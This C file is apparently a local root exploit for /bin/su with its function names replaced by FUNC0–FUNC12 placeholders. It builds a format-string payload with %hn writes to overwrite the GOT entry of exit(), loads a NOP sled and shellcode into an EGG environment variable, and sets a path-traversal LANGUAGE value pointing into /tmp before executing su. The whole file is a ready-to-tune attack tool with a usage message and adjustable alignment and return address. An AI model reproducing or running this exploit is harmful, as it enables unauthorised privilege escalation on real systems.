#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  FILENAME ; 
 int THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING ; 
 unsigned int FUNC0 (char*) ; 
 char* FUNC1 (unsigned int,unsigned int) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ) ; 
 unsigned long FUNC4 (int /*<<< orphan*/ ,char*) ; 
 char* hellcode ; 
 char* FUNC5 (unsigned long) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 scalar_t__ FUNC7 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*,...) ; 
 char* FUNC9 (char*,char*,int) ; 
 char* FUNC10 (char*) ; 
 unsigned int FUNC11 (char*,int /*<<< orphan*/ *,int) ; 

int FUNC12(int argc, char **argv, char **environ)
{
   unsigned long GOTent;
   char *evilstring, *evilfmt, *payload;
   unsigned int x_num, align=0, retaddy=0xbffffe90;

   if(argc==1) {
      FUNC8("Use as: %s <Number of %%.8x> [align] [ret addy]\n", argv[0]);
      FUNC3(0);
   }

   if(FUNC7(FILENAME)) {
      FUNC8("/bin/su is readable - using a GOT overwrite...\n");
      GOTent=FUNC4(FILENAME, "exit");
      FUNC8("GOT entry of function exit() at: 0x%lx\n", GOTent);
   } else {
      FUNC8("/bin/su is unreadable - overwriting a return address...\n");
      FUNC8("Not implemented yet... Exiting\n");
      FUNC3(0);
   }

   x_num=FUNC0(argv[THE_MEANING_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING-41]);
   if(argv[2]) align=FUNC0(argv[2]);
   if(argv[3]) retaddy=FUNC11(argv[3], NULL, 16);

   FUNC8("Using %d %%.8x\n", x_num);
   FUNC8("Using retaddy: 0x%x\n", retaddy);
   FUNC8("Using alignment: %d\n", align);

   /* Put up correct alignment */
   evilstring=FUNC9(NULL, "A", align);
   /* First write shortest %hn value */
   evilstring=FUNC9(evilstring, FUNC5(GOTent+2), 1);
   /* Used as a dummy address for %d incrementation */
   evilstring=FUNC9(evilstring, "A", 4);
   /* Write longest %hn value */
   evilstring=FUNC9(evilstring, FUNC5(GOTent), 1);
   /* And do some post alignment - this is needed! */
   evilstring=FUNC9(evilstring, "A", align);

   evilfmt=FUNC9(NULL, "%.8x", x_num);
#ifndef THIS_DOES_NOT_DO_ANYTHING_BUT_WHAT_THE_HECK
   evilfmt=FUNC9(evilfmt, FUNC1(retaddy, x_num*8), 1);
#endif

   payload=FUNC9(NULL, "EGG=", 1);
   payload=FUNC9(payload, "\x90", 500);
   payload=FUNC9(payload, hellcode, 1);

   FUNC6(evilfmt);

   /* Create a very select environment in which to function */
   /* This will make guessing the return addy unnecessary */
   environ[0] = FUNC10("LANGUAGE=sk_SK/../../../../../../tmp");
   environ[1] = payload;
   environ[2] = NULL;

   FUNC2(FILENAME, "Look mommy, I'm a kiddo!", "-u", evilstring, NULL);

   return(0);   /* Not reached */
}